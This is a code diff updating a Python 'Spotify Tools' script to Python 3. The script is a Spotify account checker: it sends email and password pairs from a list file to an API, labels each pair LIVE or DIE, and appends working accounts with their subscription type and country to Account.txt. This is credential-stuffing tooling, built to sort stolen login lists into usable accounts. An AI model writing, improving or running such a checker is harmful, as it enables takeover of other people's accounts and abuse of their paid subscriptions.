@@ -21,23 +21,23 @@ exit = "[========]"
 for l in w:
 	sys.stdout.write(l)
 	sys.stdout.flush()
-	time.sleep(0.05)
+	time.sleep(0.005)
 for l in gans:
 	sys.stdout.write(l)
 	sys.stdout.flush()
-	time.sleep(0.05)
+	time.sleep(0.005)
 for l in sangat:
 	sys.stdout.write(l)
 	sys.stdout.flush()
-	time.sleep(0.05)
+	time.sleep(0.005)
 for l in coded:
 	sys.stdout.write(l)
 	sys.stdout.flush()
-	time.sleep(0.05)
+	time.sleep(0.005)
 for l in me:
 	sys.stdout.write(l)
 	sys.stdout.flush()
-	time.sleep(0.05)
+	time.sleep(0.005)
 print(hijau.format("                       Spotify Tools\n"))
 
 
@@ -54,18 +54,19 @@ def acc():
 			pass
 		r = requests.post(api, data={
 									'email':email, 
-									'pass':passw,
-									}, headers={'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1'})
+									'password':passw,
+									}, 
+								headers={'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1'})
 
 		if r.status_code == 200:
-			result = json.loads(str(r.text))
-			if result['status'] == "LIVE":
+			result = json.loads(r.text, strict=False)
+			if result["status"] == "live":
 				live = "[LIVE] {} | {} | Subscription: {} | Country: {} ".format(email,passw, result['subscription'], result['Country']) 
 				print(live)
 				save = str(live)
 				file = open('Account.txt', 'a')
 				file.write(save+'\n')
-			elif result['status'] == "die":
+			elif result["status"] == "die":
 				print("[DIE] {} | {}".format(email,passw))
 			else:
 				print("[UNKNOWN] {} | {}".format(email,passw))
@@ -73,7 +74,7 @@ def acc():
 			print("[ERROR] API Can't be Reached")
 def email():
 	try:
-		emaillist	= str(raw_input("Enter List File: "))
+		emaillist	= input("Enter List File: ")
 	except FileNotFoundError as e:
 		error		= merah.format("Exiting......\n")
 		for l in error:
@@ -103,7 +104,7 @@ def email():
 print ("Menu :")
 print ("1. Spotify Account Checker")
 print ("2. Email Valid Spotify")
-put = raw_input("Choose: ")
+put = input("Choose: ")
 if (put == "1"):
 	os.system("cls" if os.name == "nt" else "clear")
 	print (merah.format(" _   ___                  _   _     "))
